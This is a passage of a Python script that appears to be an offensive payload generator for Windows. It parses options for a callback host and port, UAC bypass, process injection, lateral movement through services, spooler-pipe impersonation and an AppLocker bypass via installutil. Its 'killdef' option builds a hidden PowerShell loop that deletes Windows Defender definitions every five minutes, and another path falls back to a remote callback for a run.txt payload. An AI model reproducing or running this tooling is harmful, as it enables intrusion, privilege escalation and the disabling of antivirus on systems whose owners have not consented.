    parser.add_argument('--cmd','-c',required=False,dest='pscmd',help='arbitrary powershell command, only use with ps1!')
    parser.add_argument('--binary','-b',required=False,dest='binary',help='SharpUp, Hollow, or UACHelper') #, or Runspace')
    parser.add_argument('--target','-n',required=False,dest='targethost',help='target hostname, e.g. rdc01') # default: [TARGETHOST]
    parser.add_argument('--hostname','-m',required=False,dest='listenhost',help='listening hostname, e.g. app01') # default: [LISTENHOST]
    parser.add_argument('--pipe','-s',required=False,dest='pipename',help='any arbitrary pipe name that targets \\pipe\\spoolss, e.g. \\\\.\\pipe\\test\\pipe\\spoolss') # default: \\\\.\\pipe\\test\\pipe\\spoolss

    args = parser.parse_args()
    
    bitness = args.arch
    lhost = args.host
    lport = args.port
    ptype = args.ptype
    direct = args.direct
    pscmd = args.pscmd
    uacbypass = args.uacbypass
    binary = args.binary
    targethost = args.targethost
    listenhost = args.listenhost
    pipename = args.pipename

    if uacbypass == None: uacbypass = "0"
    if direct == None: direct = "0"
    if pscmd == None: pscmd = "0"
    if binary == None: binary = "0"
    if targethost == None: targethost = "0"
    if listenhost == None: listenhost = "0"
    if pipename == None: pipename = "0"

    if binary == "Inject":
        if pipename == "0":
            pipename = "explorer"
            print('[!] default inject target used: %s' % pipename)
        else:
            print('[+] inject target: %s' % pipename)

    if binary == "Lat":
        if targethost == "0":
            print('[!] -n targethost must be provided if -b Lat is chosen! terminating!')
            sys.exit()
        if pipename == "0":
            pipename = "SensorService"
            print('[!] default service used: %s' % pipename)
        else:
            print('[+] targeted service: %s' % pipename)
        if pscmd == "0":
            print('[!] no pscmd/binary specified -> remote callback to run.txt will be used!')
        else:
            if "c:\\" not in pscmd:
                print('[!] provide full path! e.g. c:\\windows\\tasks\\bin.exe . terminating!')
                sys.exit()
            else:
                print('[!] local pre-compiled option chosen! make sure victim %s exists!' % pscmd)

    if binary == "PipePipe" or binary == "SpoolSample":
        if pipename == "0":
            pipename = "\\\\.\\pipe\\test\\pipe\\spoolss" # default pipename
            print('[!] default pipename used: %s' % pipename)

    if binary == "PipePipe":
        print('[!] warning! run only with impersonation privileges!')
        print('[*] applocker bypass technique: installutil')
        if targethost == "0":
            targethost = "[TARGETHOST]"
        if listenhost == "0":
            listenhost = "[LISTENHOST]"
        if pscmd != "0":
            print('[*] -b PipePipe with -c pscmd used! feel free to add arguments to the binary! e.g. \"c:\\windows\\tasks\\SpoolSampleZero.exe rdc01 app01/pipe/test\"')
            if "c:\\" not in pscmd:
                print('[!] if -b PipePipe and -c is used, provide full path! e.g. c:\\windows\\tasks\\bin.exe . terminating!')
                sys.exit()

    if binary == "SpoolSample":
        if targethost == "0" or listenhost == "0":
            print('[!] -n targethost and -m listenhost must be provided if -b SpoolSample is chosen! (e.g. -n rdc01 -m app01). terminating!')
            sys.exit()

    if direct == "1" and ptype != "ps1":
        print ("[!] direct not compatible with %s! turning off direct" % ptype)
        direct = "0"
    if direct != "1":
        direct = "0"

    if pscmd != "0" and direct != "1":
        if binary == "Lat":
            pass
        else:
            print ("[!] arbitrary ps cmd only compatible with direct! turning off cmd")
            pscmd = "0"
    if pscmd == "killdef":
        print('[*] killdef command chosen - make sure to run with admin priv!')
        pscmd = "start-process powershell.exe -argumentlist \"while(1){& 'C:\\Program Files\\Windows Defender\\MpCmdRun.exe' -RemoveDefinitions -All;start-sleep -seconds 300}\" -windowstyle hidden"

    if uacbypass == "1" and ptype != "dll":
        print ("[!] uacbypass not compatible with %s! turning off uacbypass" % ptype)
        uacbypass = "0"

    makerunspace(bitness,lhost,lport,ptype,uacbypass,direct,pscmd,binary,targethost,listenhost,pipename)
